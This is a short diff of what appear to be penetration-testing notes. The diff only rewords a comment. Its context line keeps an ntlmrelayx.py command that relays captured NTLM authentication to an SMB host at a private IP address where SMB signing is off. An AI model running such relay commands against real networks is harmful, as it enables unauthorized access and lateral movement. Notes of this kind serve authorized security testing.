@@ -2,7 +2,7 @@
 # Setup listener
 
 ```bash
-#Relay to SMB on different host without SMB signing. Where smb://<domain controller>
+#Relay to SMB on different host without SMB signing. Where smb://<other host>
 python3 ntlmrelayx.py -t smb://10.6.15.13 -smb2support
 ```
 
